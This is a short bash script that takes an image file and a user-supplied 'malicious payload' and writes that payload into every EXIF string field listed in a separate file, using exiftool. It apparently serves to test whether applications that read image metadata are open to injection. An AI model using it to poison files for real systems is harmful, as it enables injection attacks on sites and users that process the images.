#!/bin/bash
#Usage: $0 filename_to_poison malicious_payload
FNAME="$1"
PAYLOAD="$2"

for exiftag in `cat EXIF_STRING_FIELDS.txt`; do
	echo "Setting $exiftag to $PAYLOAD on $FNAME..."
	exiftool -$exiftag="$PAYLOAD" "$FNAME"
done;
